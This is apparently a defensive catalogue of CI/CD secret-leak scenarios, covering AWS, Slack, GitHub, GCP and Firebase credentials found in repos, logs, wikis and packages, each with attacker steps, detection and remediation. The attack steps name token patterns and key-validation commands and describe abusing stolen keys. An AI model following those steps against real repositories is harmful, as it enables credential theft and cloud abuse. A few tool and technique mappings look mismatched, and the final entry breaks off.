# DevSecOps & CI/CD Security Attacks

## AWS Key Exposed in Public GitHub Repository

- **Attack Type**: Credential Exposure
- **Target**: GitHub Repo (Public)
- **Vulnerability**: Hardcoded AWS Access Key
- **MITRE**: T1552.001 (Credentials in Files)
- **Impact**: Unauthorized cloud access, resource hijacking
- **Tools**: GitLeaks, AWS CloudTrail, GitHub Actions
- **Scenario**: Developer accidentally commits AWS credentials to a public repo.
- **Attack Steps**: 1. An attacker runs GitLeaks and scans public GitHub repositories for AWS key patterns.2. Upon detecting a valid AKIA... pattern in config.js, attacker clones the repo and verifies the credential validity using aws sts get-caller-identity.3. If valid, attacker spins up EC2 instances or accesses S3 buckets.4. Blue team receives alert via AWS GuardDuty that an unusual IP accessed AWS.5. They correlate IAM activity in CloudTrail and trace it back to the GitHub commit.6. Using GitHub's commit history, the exposed key and timestamp are identified.7. SOC revokes the credentials, notifies the developer, and initiates code scrub and GitHub secret scanning enablement.8. Long-term fix: implement pre-commit hooks and enforce GitHub Advanced Security secret scanning.
- **Detection**: GitLeaks, CloudTrail, Secret Scanning
- **Solution**: Rotate credentials, enforce commit policies
- **Tags**: #aws #gitleaks #secretleak #publicrepo

## Slack Webhook Token Found in JavaScript File

- **Attack Type**: API Key Exposure
- **Target**: JavaScript Code
- **Vulnerability**: Slack token in frontend
- **MITRE**: T1552.001
- **Impact**: Slack abuse, impersonation, trust erosion
- **Tools**: TruffleHog, GitHub Secret Scanning
- **Scenario**: Slack token exposed in frontend code, enabling message spamming.
- **Attack Steps**: 1. Adversary scans JavaScript-heavy GitHub repos using TruffleHog looking for known Slack token patterns like xoxb-, xoxp-.2. Finds a valid webhook URL in a commit.3. Verifies it by sending a test message to the associated Slack channel.4. Starts spamming messages, impersonating internal comms.5. Blue team identifies strange messages in Slack logs.6. Slack audit reveals webhook URL origin.7. GitHub repo is reviewed for history of token exposure.8. Blue team invalidates webhook, adds Slack tokens to GitHub’s token scanning regex list, and trains developers on secure webhook usage.9. Introduces vault-based secret management in CI/CD pipelines.
- **Detection**: Slack logs, commit history review
- **Solution**: Revoke token, rotate webhook, vault integration
- **Tags**: #slacktoken #webhookabuse #secretexposure

## GitHub Personal Access Token in Push History

- **Attack Type**: Credential Disclosure
- **Target**: GitHub Organization
- **Vulnerability**: Personal Access Token
- **MITRE**: T1552.001
- **Impact**: Repo compromise, IP theft
- **Tools**: GitHub API, Gitrob, GitHub Advanced Security
- **Scenario**: Developer pushes a GitHub PAT by mistake; attacker uses it for repo access.
- **Attack Steps**: 1. Attacker scans pushed commit diffs using Gitrob and identifies a personal access token pattern.2. Uses GitHub API to test the token's permissions.3. Gathers repo list and accesses private repos.4. Steals intellectual property and modifies files.5. GitHub security logs detect the token being used from an unusual location.6. SOC uses git log to identify the leak's commit hash.7. Token is revoked and security team performs incident response.8. Security adds GitHub PAT patterns to custom DLP rules.9. Dev teams are required to implement Git hooks with Git-Secrets for local validation before pushing.
- **Detection**: GitHub Advanced Security, Git logs
- **Solution**: Token revocation, enforce secrets policy
- **Tags**: #githubpat #secretdisclosure #devsecops

## GCP Service Account Key in Repo Fork

- **Attack Type**: GCP Credential Leak
- **Target**: GitHub Fork
- **Vulnerability**: GCP Service Account Key
- **MITRE**: T1552.001
- **Impact**: GCP compromise, resource misuse
- **Tools**: GitLeaks, Google Secret Scanner
- **Scenario**: GCP JSON key committed to repo and forked before removal.
- **Attack Steps**: 1. GitLeaks identifies a client_email and private_key block inside service-account.json.2. A malicious actor finds the fork and downloads the key.3. Uses GCP SDK to authenticate and list buckets and instances.4. SOC detects anomalies in access locations via GCP Security Command Center.5. Forensic review shows access before key was revoked.6. IR team finds that a student contributor forked the repo with secrets.7. Security rotates all exposed credentials, restricts fork permissions, and updates GitHub visibility rules.8. Adds automated GCP key scanning in CI/CD and implements Vault-based credential delivery.
- **Detection**: GCP logs, Git commit forensics
- **Solution**: Restrict forks, rotate keys, CI/CD scanning
- **Tags**: #gcp #serviceaccount #keyleak

## Azure DevOps PAT in README.md

- **Attack Type**: Token Exposure
- **Target**: Markdown File
- **Vulnerability**: Azure DevOps Token in plaintext
- **MITRE**: T1552.001
- **Impact**: Source code theft, project compromise
- **Tools**: TruffleHog, Azure DevOps Audit Logs
- **Scenario**: A developer accidentally posts a valid Azure DevOps token in a sample README.md.
- **Attack Steps**: 1. Attacker uses regex-based scan across markdown files on GitHub to find Azure DevOps PATs.2. Identifies one in a public repo's README.3. Authenticates using the PAT and clones several private projects.4. Blue team sees unusual access patterns in Azure audit logs.5. Correlates the token use with the GitHub repo commit timestamp.6. Revokes the token, contacts the repo owner, and scrubs Git history.7. Implements commit signing and peer review policy for sensitive projects.8. Adds DevOps token patterns to GitHub's enterprise DLP config.
- **Detection**: Azure Audit Logs + Git logs
- **Solution**: Revoke token, enforce sensitive content review
- **Tags**: #azuredevops #pat #readmeleak

## Exposed Private API Key in Android Repository

- **Attack Type**: Mobile Key Disclosure
- **Target**: Mobile App Repo
- **Vulnerability**: API Key hardcoded in strings.xml
- **MITRE**: T1552.001
- **Impact**: Payment fraud, financial loss
- **Tools**: GitLeaks, MobSF, VirusTotal, GitHub DLP
- **Scenario**: API key for a payment gateway left inside a public Android GitHub repo.
- **Attack Steps**: 1. TruffleHog finds an API key pattern hardcoded in strings.xml of an Android app repo.2. Attacker extracts it and uses it to initiate fraudulent payment requests via the gateway’s API.3. The payment provider flags abuse due to abnormal IPs and velocity.4. Blue team traces the key back to the exposed repo.5. Revokes the key, contacts app devs to issue hotfix removing the key.6. Static scanning is enforced on all Android repos using MobSF.7. Sensitive API keys are moved to remote config/vault managed outside source.
- **Detection**: Git scanning, Payment API logs
- **Solution**: Vault config, mobile hardening
- **Tags**: #android #apikeyexposure #ci/cd

## OAuth Token Exposure via GitHub Gist

- **Attack Type**: Token Disclosure
- **Target**: GitHub Gist
- **Vulnerability**: OAuth Token in sample code
- **MITRE**: T1552.001
- **Impact**: Account compromise, data abuse
- **Tools**: GitHub Gist Search, GitHub Security Alerts
- **Scenario**: A user posts a GitHub Gist to demonstrate OAuth but forgets to redact the token.
- **Attack Steps**: 1. Adversary scrapes GitHub Gist using keyword and regex matching for access_token patterns.2. Finds a valid token posted alongside sample OAuth code.3. Uses token to impersonate the user in connected apps or access data.4. GitHub detects token misuse and flags it via security alert.5. Blue team notifies user, revokes token, and deletes the Gist.6. Adds Gist scanning to organization’s GitHub monitoring.7. Educates devs on redaction and safe code examples.
- **Detection**: GitHub alert + app logs
- **Solution**: Token revocation + redaction policies
- **Tags**: #gistleak #oauthtoken #githubloss

## Private Token in .env File Pushed to GitHub

- **Attack Type**: Secret File Exposure
- **Target**: GitHub Repo
- **Vulnerability**: Misconfigured .gitignore
- **MITRE**: T1552.001
- **Impact**: API abuse, data leakage
- **Tools**: GitLeaks, GitHub Advanced Security
- **Scenario**: .env file containing API credentials committed and pushed accidentally.
- **Attack Steps**: 1. GitLeaks detects .env files in GitHub with secret patterns like SECRET_KEY=....2. Attacker clones repo and enumerates keys.3. Uses one of the tokens to authenticate with a third-party analytics API and fetches internal usage data.4. Blue team investigates API dashboard logs after abuse alert from the third party.5. Git commit history reveals .env file was mistakenly added.6. Revokes tokens, adds .env to .gitignore and rewrites Git history.7. Implements GitHub branch protection and pre-commit scanning.
- **Detection**: Secret scanning, API usage logs
- **Solution**: Ignore config files, rotate keys
- **Tags**: #envfile #gitignorefail #tokenleak

## Exposure of API Credentials via GitHub Action Log

- **Attack Type**: CI/CD Token Exposure
- **Target**: GitHub Actions
- **Vulnerability**: Misconfigured CI logging
- **MITRE**: T1552.001
- **Impact**: Service impersonation, abuse
- **Tools**: GitHub Actions, Audit Log, Regex Monitor
- **Scenario**: API credentials printed in GitHub Action job logs during a failed build
- **Attack Steps**: 1. Attacker monitors GitHub Actions logs for open source projects.2. Sees a failed workflow run printing secret API keys.3. Uses the exposed credentials to abuse the API, impersonating the project.4. GitHub security tools detect the token pattern and raise alert.5. Security team invalidates the keys and masks secrets in action steps.6. Reviews all past logs to identify similar leakage.7. Implements secrets.GITHUB_TOKEN masking and disables unprotected echo statements in workflows.8. Security education sessions held for CI/CD engineers.
- **Detection**: GitHub Logs + Secret scanning
- **Solution**: Masking in CI/CD + secret policy
- **Tags**: #ci/cd #githubactions #logleak

## Public Exposure of Email API Key in Config File

- **Attack Type**: Credential Disclosure
- **Target**: GitHub Repo
- **Vulnerability**: Hardcoded Mail API Key
- **MITRE**: T1552.001
- **Impact**: Spam, reputation damage
- **Tools**: GitLeaks, Regex, GitHub DLP Tools
- **Scenario**: Mailgun or SendGrid API key leaked via config.js file in a public repo
- **Attack Steps**: 1. GitHub repo with email-sending functionality includes MAILGUN_API_KEY in config.js.2. TruffleHog detects the key and attacker uses it to send mass spam using project’s account.3. Sends thousands of phishing emails, leading to domain blacklisting.4. Email provider alerts user of abuse.5. Security team finds the origin of key leak via GitHub history.6. Key is revoked and DNS SPF/DKIM settings are hardened.7. Developers are instructed to move secrets to environment variables and encrypted config files.8. Email sending services are integrated with IAM roles for temporary access.
- **Detection**: Regex scan, email provider abuse alert
- **Solution**: Revoke key, rotate config system
- **Tags**: #mailgun #apikey #phishingdamage

## Public Exposure of GitHub OAuth App Secret

- **Attack Type**: OAuth App Key Leak
- **Target**: GitHub Repo
- **Vulnerability**: Hardcoded OAuth App Secret
- **MITRE**: T1552.001
- **Impact**: Account hijack, data exfiltration
- **Tools**: GitLeaks, GitHub Advanced Security, TruffleHog
- **Scenario**: A GitHub OAuth App’s client_secret is pushed to public repo, allowing token forgery or abuse.
- **Attack Steps**: 1. A developer builds a GitHub OAuth integration and mistakenly commits the client_id and client_secret to settings.py.2. TruffleHog or GitHub Secret Scanning alerts adversaries to the leak in a high-starred repo.3. Attacker uses the credentials to generate access tokens via the GitHub OAuth flow.4. These tokens are then used to query user data and repositories with elevated scopes.5. SOC identifies suspicious OAuth authorization patterns in GitHub audit logs.6. The leaked secret is traced back to the repo and commit using GitHub history.7. Developers rotate the secret, delete the commit history, and issue a new version of the app.8. Long-term solution includes vault-based secret management and GitHub Actions workflows to auto-reject secrets in push commits.
- **Detection**: GitHub audit logs, OAuth request monitoring
- **Solution**: Rotate secret, auto-block exposed secrets
- **Tags**: #oauthleak #github #devsecops

## Kubernetes Token Leaked via Helm Chart Repo

- **Attack Type**: Cluster Token Exposure
- **Target**: Helm Repo
- **Vulnerability**: Hardcoded Service Account Token
- **MITRE**: T1552.001
- **Impact**: Cluster enumeration, possible privilege escalation
- **Tools**: Gitrob, kube-hunter, helm-secrets
- **Scenario**: A base64-encoded Kubernetes service account token is exposed in a Helm values file.
- **Attack Steps**: 1. Attacker scans GitHub for Helm chart repos and parses values.yaml for sensitive base64 blobs.2. A service account token string is discovered in a test values file.3. Attacker decodes it and uses kubectl --token=... to access cluster data via public ingress.4. Kubernetes audit logs detect unknown IPs attempting API server queries.5. Security team reviews the GitHub repo and finds test artifacts exposing real tokens.6. Token is revoked and Kubernetes RBAC policies are tightened.7. All sensitive Helm deployments are migrated to use encrypted values via helm-secrets.8. Developers are trained to use kubeconfig mappings instead of hardcoded tokens for testing.
- **Detection**: K8s API logs, Helm repo diffs
- **Solution**: Use helm-secrets, disable token-based config files
- **Tags**: #kubernetes #helm #tokenleak

## Jenkins Build Secrets Logged in Console Output

- **Attack Type**: CI/CD Credential Disclosure
- **Target**: Jenkins Console Log
- **Vulnerability**: Poor CI/CD Logging Policy
- **MITRE**: T1552.001
- **Impact**: Infrastructure abuse, unauthorized access
- **Tools**: Jenkins, grep, Jenkins Audit Logs
- **Scenario**: Jenkins job fails and prints secret credentials into public logs.
- **Attack Steps**: 1. Jenkins pipeline is configured with sensitive environment variables (e.g., AWS_SECRET_KEY).2. A sh command echoing an error inadvertently prints secrets into the console output.3. Jenkins is configured for public access, and logs are cached without protection.4. A threat actor scrapes Jenkins logs across open domains looking for =AKIA... or base64 tokens.5. Secret is abused to spin up EC2 resources.6. SOC team receives billing alerts and investigates Jenkins log leak.7. Audit trail confirms that secrets were printed during a faulty echo line.8. Secrets are revoked, Jenkins is reconfigured to redact sensitive vars from logs, and logging plugins like MaskPasswordsPlugin are enforced.
- **Detection**: Log grep patterns, cloud API abuse alerts
- **Solution**: Redact logs, CI/CD secret masking enforcement
- **Tags**: #jenkins #cicd #secretsinlogs

## AWS Key Found in Git Submodule History

- **Attack Type**: Key Leakage via Submodule
- **Target**: Git Submodule
- **Vulnerability**: Submodule Exposing Old Secrets
- **MITRE**: T1552.001
- **Impact**: Data access, unmonitored cloud usage
- **Tools**: GitLeaks, Subjack, Git log
- **Scenario**: An AWS key resides inside an old Git submodule, ignored by main repo scanning tools.
- **Attack Steps**: 1. Git repo includes a submodule that was imported from another repo which had a config.py file with AWS credentials.2. GitLeaks fails to detect due to shallow scanning on submodules.3. An attacker clones the full submodule recursively and finds the credentials.4. Uses aws s3 ls and ec2 describe-instances to validate access.5. SOC flags unusual S3 downloads from unknown IPs.6. Incident response team tracks the leak to the .gitmodules reference.7. The submodule is purged from history and AWS keys are rotated.8. All CI scanners are updated to recursively scan submodules and old tags.
- **Detection**: S3 access logs, deep Git history analysis
- **Solution**: Deep-scan all submodules + purge Git history
- **Tags**: #gitmodules #awsleak #submodulevuln

## Secret Found in GitHub Enterprise Fork

- **Attack Type**: Internal Fork Leak
- **Target**: GitHub Fork
- **Vulnerability**: Misuse of Forking Mechanism
- **MITRE**: T1552.001
- **Impact**: Internal data exposure
- **Tools**: GitHub Enterprise, GitLeaks, DLP
- **Scenario**: An internal GitHub Enterprise repo is forked and pushed publicly with secrets intact.
- **Attack Steps**: 1. Developer forks internal microservice repo containing .env file with DB credentials.2. Pushes fork to personal GitHub public account for testing.3. GitHub DLP detects .env with regex match and sends alert.4. SOC investigates commit and confirms credentials were real and active.5. Fork is taken down via GitHub abuse report.6. Credentials are revoked and downstream services are patched.7. Developers are required to use internal-only forks.8. DLP alerting integrated with SIEM and all forks now trigger scans.
- **Detection**: GitHub DLP alerts, manual repo diffing
- **Solution**: Disallow public forks, restrict .env access
- **Tags**: #forkleak #ghe #internaltools

## Terraform State File Exposure with Secrets

- **Attack Type**: IaC Secrets Disclosure
- **Target**: Terraform Repo
- **Vulnerability**: Exposed tfstate
- **MITRE**: T1552.001
- **Impact**: Full infra compromise, DB access
- **Tools**: tfsec, TruffleHog, GitHub Secret Scanning
- **Scenario**: Terraform terraform.tfstate file pushed with embedded provider tokens and sensitive outputs.
- **Attack Steps**: 1. Adversary scans GitHub for terraform.tfstate or *.tfstate.backup file extensions.2. Finds a public repo where the state file has embedded cloud credentials and RDS passwords.3. Extracts them and connects to DB endpoint.4. Blue team gets notified of suspicious DB login from unusual geo.5. Investigates and traces the credentials via code search to the state file.6. Removes file, rotates secrets, and sets .gitignore rules.7. Implements remote state storage in S3 with encryption and versioning.8. Developers are instructed to never commit local state files.
- **Detection**: Secret scanning + cloud login monitoring
- **Solution**: Remote encrypted state + enforce ignore config
- **Tags**: #terraform #tfstate #iacleak

## CircleCI Config Leaks Slack Token

- **Attack Type**: Pipeline Secrets in YAML
- **Target**: CircleCI Pipeline
- **Vulnerability**: Secrets in CI/CD YAML
- **MITRE**: T1552.001
- **Impact**: Slack abuse, social engineering
- **Tools**: TruffleHog, CircleCI Dashboard
- **Scenario**: CircleCI YAML config file commits Slack tokens directly in workflow steps.
- **Attack Steps**: 1. A malicious actor finds .circleci/config.yml with Slack token in notify step.2. Decodes and tests token via webhook call.3. Begins injecting fake build failure messages to internal Slack channels.4. Blue team is alerted to strange message formatting.5. Tracks webhook origin via timestamp and finds GitHub commit.6. Revokes token, enables secret masking in CircleCI.7. Trains dev team to use project environment variables.8. Adds automated secret scanning during PR pipeline execution.
- **Detection**: Slack logs + config diffing
- **Solution**: Secret masking + env-based token injection
- **Tags**: #circleci #ci/cd #slacktokenleak

## Private Repo Token Leaked via Issue Screenshot

- **Attack Type**: Screenshot Metadata Leak
- **Target**: GitHub Issue Tracker
- **Vulnerability**: Accidental Screenshot Disclosure
- **MITRE**: T1565.002
- **Impact**: Unauthorized preview access
- **Tools**: OCR tools, GitHub Issue Audit, DLP
- **Scenario**: Token accidentally appears in a screenshot uploaded in GitHub issue.
- **Attack Steps**: 1. Dev uploads screenshot of error message into a GitHub issue without noticing partial token visible in background.2. OCR bots parse text from uploaded image and attacker identifies it as a JWT token.3. Tests it via login endpoint and gains access to internal preview builds.4. GitHub security alerts team due to suspicious login and file downloads.5. Forensics confirm image upload was origin of exposure.6. Token revoked, issue image removed, user warned.7. Image redaction process implemented across engineering.8. DLP tool enhanced to run OCR on uploaded images.
- **Detection**: GitHub Alerts + OCR + access logs
- **Solution**: Redact uploads, scan images with OCR
- **Tags**: #screenshotleak #ocr #tokenviaimage

## CI/CD Logs Store Expired Secret Used by Attacker

- **Attack Type**: Expired Key Reuse
- **Target**: GitLab Logs
- **Vulnerability**: Misconfigured token expiry policy
- **MITRE**: T1552.001
- **Impact**: Unauthorized access via expired tokens
- **Tools**: GitLab CI, grep, TruffleHog, Cloud logs
- **Scenario**: Old secrets exposed in logs still accepted by weak auth system.
- **Attack Steps**: 1. CI/CD logs from GitLab are found by attacker with an expired but still accepted API key.2. Attempts to use it and surprisingly gains access to staging environment.3. SOC is alerted by system access from external IP.4. Review of audit logs and CI/CD logs confirms use of expired token.5. Root cause identified: misconfigured TTL policy didn’t fully revoke token access.6. DevOps disables token permanently and patches the IAM rules.7. Teams enforce strict expiration policy and use dynamic secrets moving forward.
- **Detection**: CI logs + IAM audit trail
- **Solution**: Fix TTL, enforce rotating/dynamic secrets
- **Tags**: #expiredtoken #ci/cd #tokenreusethreat

## Exposed API Key in GitHub Codespace Auto-Init

- **Attack Type**: Codespace Leak
- **Target**: GitHub Codespace
- **Vulnerability**: Bootstrap Script Exposure
- **MITRE**: T1552.001
- **Impact**: Test backend compromise
- **Tools**: Codespaces, TruffleHog, Secret Scanning
- **Scenario**: Codespace repo initialized with test secrets already hardcoded in entry script.
- **Attack Steps**: 1. GitHub Codespace repo auto-loads init.sh during container build with embedded keys.2. An adversary clones repo and accesses init.sh, finding active API tokens.3. Tokens are used to contact backend API used for staging/testing.4. Blue team observes unusual traffic to test endpoints.5. Investigates Codespace logs and discovers the secret-laden file.6. Rotates all embedded tokens and patches all bootstrapped scripts.7. Updates team policies to generate temporary keys via vault at runtime.8. Implements secret injection via environment only, avoiding flat files.
- **Detection**: Codespace build logs + API traffic logs
- **Solution**: Vault integration + secure init scripts
- **Tags**: #codespace #apiinit #devsecops

## GitHub Actions Workflow Leak of AWS Access Key

- **Attack Type**: Workflow Secrets Exposure
- **Target**: GitHub Workflow
- **Vulnerability**: Hardcoded AWS Key in CI Config
- **MITRE**: T1552.001
- **Impact**: Cloud compromise, resource hijacking
- **Tools**: GitHub Actions, GitLeaks, AWS CloudTrail
- **Scenario**: GitHub Actions workflow YAML exposes hardcoded AWS keys used in build step.
- **Attack Steps**: 1. Developer embeds AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY in main.yml under env: section.2. Workflow gets triggered by PR and the secrets are logged due to failed build.3. GitLeaks or external scanners discover the leak in the commit diff.4. Attacker clones repo, extracts keys, and validates with aws sts get-caller-identity.5. Using credentials, attacker spawns EC2 instances and S3 exfiltration.6. SOC sees burst in billing dashboard and alerts for key usage from unknown IP.7. Keys are revoked and IAM roles reconfigured with tighter policies.8. GitHub Actions workflows updated to inject secrets via repository or org secrets, never directly.
- **Detection**: AWS billing alerts + audit logs
- **Solution**: CI Secrets injection only via vaults
- **Tags**: #githubactions #awskeyleak #workflowsecrets

## Python Script with Embedded Slack Bot Token

- **Attack Type**: Hardcoded Bot Token
- **Target**: Python Repo
- **Vulnerability**: Slack Bot Token in Code
- **MITRE**: T1552.001
- **Impact**: Unauthorized bot control, impersonation
- **Tools**: TruffleHog, Slack Audit Logs, GitHub Search
- **Scenario**: Slack bot token in public Python repo enables unsolicited access to internal bot.
- **Attack Steps**: 1. Python developer publishes utility script to GitHub with SLACK_BOT_TOKEN = 'xoxb-...'.2. A bot scanning GitHub using xoxb regex patterns detects and notifies threat actor.3. Token is used to send test messages to internal Slack workspace and access channels.4. Blue team sees unauthorized bot messages in sensitive channels.5. Investigation tracks token to public repo commit.6. Slack token is revoked and app_management rights are updated.7. Slack workspace enforces token whitelisting and approval workflows for all bots.8. Devs trained to use secure variable stores, not inline tokens.
- **Detection**: Slack logs, GitHub commit trace
- **Solution**: Secure Slack tokens, audit bot installs
- **Tags**: #slackbotleak #xoxbtoken #pythonrepo

## GitLab CI/CD Token Exposed in Merge Conflict

- **Attack Type**: Merge Conflict Token Leak
- **Target**: GitLab CI
- **Vulnerability**: Git Merge Conflict Artefact Leak
- **MITRE**: T1552.001
- **Impact**: Pipeline hijack, build sabotage
- **Tools**: GitLab, VSCode, TruffleHog
- **Scenario**: During a bad merge, sensitive GitLab token remains in both HEAD and incoming branch
- **Attack Steps**: 1. Merge conflict arises during pipeline refactor and GITLAB_TOKEN is present in both branches.2. Developer forgets to remove both and commits conflict markers with both tokens.3. TruffleHog detects it after PR is merged and repo is public.4. Token is still valid and attacker uses it to run remote pipelines.5. Alert triggered due to job execution from abnormal region.6. DevSecOps team finds commit and validates leak.7. Token revoked and project access logs reviewed.8. GitLab CI pipelines are updated to mask and auto-reject merge artifacts with unresolved tokens.
- **Detection**: Job execution origin audit
- **Solution**: Pre-merge hooks + automatic conflict scanners
- **Tags**: #gitlab #tokenleak #mergeconflict

## Public API Key Leak in JavaScript Frontend

- **Attack Type**: Frontend Key Disclosure
- **Target**: JavaScript CDN File
- **Vulnerability**: Static API Key in Frontend Code
- **MITRE**: T1552.001
- **Impact**: Data leak, abuse of backend services
- **Tools**: JS Static Analysis, TruffleHog, Nuclei
- **Scenario**: Publicly hosted JS file contains API key for backend services.
- **Attack Steps**: 1. Frontend React app hosts api.js file with key: const apiKey = 'sk_test_abc123...'.2. File is accessible via CDN and indexed by search engines.3. API key belongs to backend auth service or payment system.4. Attacker scrapes JS using linkfinder, extracts keys.5. Tries key via Postman and gets limited API responses.6. Uses key to fuzz endpoints and gain user metadata or initiate payments.7. Detection via abnormal API usage patterns with same key.8. Key revoked, and development policy updated to proxy all backend calls with no static key exposure.
- **Detection**: CDN logs, rate anomalies on API
- **Solution**: Reverse proxy for frontend + no client-side secrets
- **Tags**: #frontendleak #apikey #reactjs

## AWS Secrets in .env File Committed to Repo

- **Attack Type**: Environment File Exposure
- **Target**: GitHub Repo
- **Vulnerability**: .env File Containing Secrets
- **MITRE**: T1552.001
- **Impact**: Resource abuse, DB access
- **Tools**: GitHub Secret Scanning, GitLeaks
- **Scenario**: .env file with secrets pushed accidentally during local test deployment.
- **Attack Steps**: 1. Developer creates .env with AWS keys, DB_PASS and deploy tokens.2. .gitignore was not configured, and file is committed.3. GitHub Secret Scanning identifies keys within 5 mins of push.4. Attacker clones and uses keys for S3 and DB operations.5. Alert received from GitHub + cloud service about leaked keys.6. Repo commit removed and .env secrets rotated.7. CI pipelines updated to include pre-commit hooks for scanning .env.8. .gitignore and DLP-based commit hooks enforced across repos.
- **Detection**: GitHub alert + cloud IAM audit
- **Solution**: Pre-commit secret detection + enforce ignore
- **Tags**: #envfile #awssecretleak #precommitcheck

## Bitbucket Pipeline Step Exposes GitHub PAT

- **Attack Type**: Cross-Platform Token Exposure
- **Target**: Bitbucket Repo
- **Vulnerability**: GitHub Token in External Pipeline
- **MITRE**: T1552.001
- **Impact**: Repo abuse, insider data leak
- **Tools**: Bitbucket Pipelines, TruffleHog, GitHub
- **Scenario**: A GitHub Personal Access Token appears in Bitbucket pipeline config step.
- **Attack Steps**: 1. Org using both GitHub and Bitbucket has config file in Bitbucket referencing GitHub API via hardcoded PAT.2. bitbucket-pipelines.yml file gets committed and token is visible in curl -H line.3. Attacker scrapes Bitbucket public projects and finds token.4. Token used to access GitHub repo contents and PR discussions.5. Unusual GitHub access pattern detected from unfamiliar agent.6. Token revoked and both GitHub + Bitbucket projects reviewed.7. Org implements shared secrets vault accessed by both platforms.8. Policy enforced: No cross-token use across services.
- **Detection**: GitHub access logs + Bitbucket config scan
- **Solution**: Use vault-based token injections
- **Tags**: #bitbucket #patleak #cicdcrosslink

## Developer Token Disclosed in GitHub Wiki Page

- **Attack Type**: Documentation Leak
- **Target**: GitHub Wiki Page
- **Vulnerability**: Insecure documentation practices
- **MITRE**: T1552.001
- **Impact**: Info leak, test abuse
- **Tools**: GitHub Wiki, GitHub Search, GitGuardian
- **Scenario**: Internal GitHub Wiki page contains sensitive token for internal API testing.
- **Attack Steps**: 1. Developer writes internal guide and pastes curl commands with token examples.2. Wiki is mistakenly set as public.3. GitGuardian detects token pattern in raw Wiki file.4. Token is still valid and attacker uses it to retrieve internal metrics.5. Team receives API alert from usage spike.6. Token revoked, Wiki reverted and permissions fixed.7. Documentation templates updated to use fake tokens.8. GitHub Wiki scanning added to secret detection tooling.
- **Detection**: GitGuardian alert + API usage log
- **Solution**: Dummy data in docs, restrict wiki visibility
- **Tags**: #wikileak #devtoken #apitestdata

## Dockerfile Contains Hardcoded Git Credential

- **Attack Type**: Container Build Secret
- **Target**: Dockerfile / GitHub
- **Vulnerability**: Credentials in Container Build Steps
- **MITRE**: T1552.001
- **Impact**: Private repo compromise
- **Tools**: Dockerfile Linter, TruffleHog, Docker Hub
- **Scenario**: Dockerfile has RUN git clone line with embedded username:token credentials.
- **Attack Steps**: 1. Dockerfile in project repo uses RUN git clone https://username:token@github.com/....2. TruffleHog picks it up when the Dockerfile is indexed.3. Adversary builds Dockerfile or downloads it from Docker Hub, extracts command line.4. Uses credentials to access private GitHub repo.5. Blue team detects clone from unfamiliar region.6. Token revoked and build process changed.7. Git auth replaced with deploy key or GitHub Actions token.8. All Dockerfiles scanned before publish to public repos.
- **Detection**: GitHub logs + Dockerfile scanners
- **Solution**: No inline creds, use scoped tokens or keys
- **Tags**: #dockerfile #gitcreds #buildleak

## NPM Package Publishes Test Script with Secrets

- **Attack Type**: Package Repo Exposure
- **Target**: NPM Registry
- **Vulnerability**: Secrets in Published Package
- **MITRE**: T1552.001
- **Impact**: API compromise, package trust issue
- **Tools**: NPM, TruffleHog, npq
- **Scenario**: NPM package’s test script pushes test secrets into the published tarball.
- **Attack Steps**: 1. Dev adds test.js file with credentials in root for quick testing.2. Runs npm publish and doesn't exclude it in .npmignore.3. Script is publicly downloadable via npm install.4. TruffleHog bot scans package tarballs for common key patterns.5. Secrets discovered and abused for internal API access.6. NPM package deprecated and patched.7. CI pipeline for NPM packages updated to exclude all test files.8. Pre-publish scripts scan all payload contents for secrets.
- **Detection**: npq or TruffleHog scans
- **Solution**: Use .npmignore, prepublish DLP tooling
- **Tags**: #npmleak #testcode #packageloss

## GitHub Pages Publish Static Config with Token

- **Attack Type**: GitHub Pages Exposure
- **Target**: GitHub Pages
- **Vulnerability**: Tokens in Static Web Content
- **MITRE**: T1552.001
- **Impact**: Public site abuse, backend test leak
- **Tools**: GitHub Pages, GitLeaks
- **Scenario**: Static site hosted via GitHub Pages includes config.js with tokens.
- **Attack Steps**: 1. Developer hosts static site and commits config.js with real API tokens.2. GitHub Pages builds the site and serves it at custom domain.3. Attacker crawls JS files for apiKey or token= patterns.4. Uses token to access backend test endpoints.5. Alert from backend API shows abnormal IP usage.6. Tokens revoked and GitHub repo updated.7. Static config files split into safe + runtime-loaded dynamic config.8. GitHub Pages projects scanned using DLP rule sets before deployment.
- **Detection**: JS file scraping + GitHub commit diffing
- **Solution**: Dynamic config loading, no static secrets
- **Tags**: #githubpages #staticconfig #leakedtoken

## GitHub Commit History Reveals AWS Token

- **Attack Type**: Token in Git History
- **Target**: GitHub Repo History
- **Vulnerability**: Token Not Fully Removed From History
- **MITRE**: T1552.001
- **Impact**: Unauthorized AWS access
- **Tools**: GitHub CLI, GitLeaks, BFG Repo-Cleaner
- **Scenario**: Token was removed in later commit but exists in historical version of file
- **Attack Steps**: 1. Developer accidentally commits AWS credentials in a config file.2. Later realizes and removes the line from the current file.3. However, the secret is still present in the commit history.4. Attacker runs GitLeaks on the entire repo and finds the token in the old commit.5. Token is used to gain programmatic access to AWS and run recon on buckets and EC2.6. AWS GuardDuty flags suspicious requests from unexpected regions.7. The secret is revoked and Git history is rewritten using BFG.8. Developers are trained to scrub sensitive data and use rotate + rebase for exposed credentials.
- **Detection**: Git history scanning tools
- **Solution**: Git scrub tools + secret rotation
- **Tags**: #gitleaks #bfg #awskeyexposure

## GitHub Pages Repo Leaks Firebase Admin Key

- **Attack Type**: Firebase Admin SDK Exposure
- **Target**: GitHub Pages
- **Vulnerability**: Admin Key in Client-Facing App
- **MITRE**: T1552.001
- **Impact**: Backend control, user data theft
- **Tools**: Firebase CLI, GitHub Pages, GitLeaks
- **Scenario**: Static frontend site commits firebase-admin key meant only for server usage.
- **Attack Steps**: 1. Developer includes Firebase Admin SDK config with real keys in the frontend repo.2. The config file is included in src/firebase.js which is bundled and published via GitHub Pages.3. Threat actor inspects public JS via browser dev tools, locates the admin key.4. Using the key, actor connects to Firebase backend and reads/write data.5. Firebase dashboard logs unauthorized activity from unexpected source.6. Blue team investigates and identifies leaked key via version history.7. Key is revoked and moved to cloud function environment only.8. CI pipeline updated to prevent bundling of any .env or config files.
- **Detection**: Firebase usage logs + JS reverse inspect
- **Solution**: Use client SDK, keep admin keys server-side only
- **Tags**: #firebaseleak #githubpages #frontendconfig

## Secret in Issue Tracker (JIRA/GitHub Issues)

- **Attack Type**: Token Leak in Ticket or PR Notes
- **Target**: GitHub Issues
- **Vulnerability**: Secrets in Developer Debug Comments
- **MITRE**: T1552.001
- **Impact**: Token misuse, data disclosure
- **Tools**: GitHub Issues, GitGuardian, Regex Parsers
- **Scenario**: Developer pastes real token in GitHub issue comment while debugging
